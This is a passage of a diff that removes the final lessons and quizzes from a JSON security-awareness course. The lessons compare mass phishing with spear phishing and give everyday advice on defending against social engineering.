-              "body": "Mass Phishing is sent broadly to thousands of random recipients, generic with often obvious errors, lower success rate per-message but scale compensates. Spear Phishing is carefully targeted at a specific individual or organisation, highly personalised using researched details (OSINT), with a much higher success rate per-message due to credibility — for example, an email referencing your actual manager's name and a real project."
-            }
-          ],
-          "quiz": {
-            "question": "What makes Spear Phishing more dangerous than generic Mass Phishing?",
-            "options": [
-              "It's sent to more people at once",
-              "It's highly personalised using researched details, making it far more credible and harder to spot",
-              "It never contains any links",
-              "It only targets computers, not people"
-            ],
-            "correct_index": 1,
-            "explanation": "Spear phishing uses researched, personal details (often gathered via OSINT) to make the message far more believable, dramatically increasing its success rate compared to generic mass phishing."
-          }
-        },
-        {
-          "id": "u9_m5_l5",
-          "title": "Defense & Building Resilience",
-          "cards": [
-            {
-              "id": "u9_m5_l5_c1",
-              "title": "Defending Against Social Engineering",
-              "body": "Pause before acting on urgency — legitimate requests can withstand a moment of verification. Verify unusual requests through a separate, known communication channel (call, don't reply). Check sender addresses and links carefully — hover before you click. Be cautious about what you share publicly, since it can become ammunition for a targeted attack. Report suspected phishing immediately rather than deleting it silently."
-            },
-            {
-              "id": "u9_m5_l5_c2",
-              "title": "Building Resilience — Personal & Organisational",
-              "body": "You are the last line of defence technology alone cannot replace — treat every unexpected urgent request with healthy scepticism and keep your personal OSINT footprint minimal. No single control fully stops social engineering; resilience comes from layered, ongoing effort: regular security awareness training, clear blame-free reporting channels, and technical controls like email gateways — combined, not alone."
-            }
-          ],
-          "quiz": {
-            "question": "What is the recommended way to verify an unusual, urgent request (e.g. a wire transfer email from your 'manager')?",
-            "options": [
-              "Reply immediately to the same email to confirm",
-              "Verify through a separate, known communication channel, such as calling the person directly",
-              "Forward it to more people to double check",
-              "Comply immediately since it claims to be urgent"
-            ],
-            "correct_index": 1,
-            "explanation": "Verifying through a separate, already-trusted channel (like a phone call) prevents an attacker who has spoofed or compromised the original channel from successfully impersonating someone."
-          }
-        }
-      ]
-    }
-  ]
-}
   ]
 }
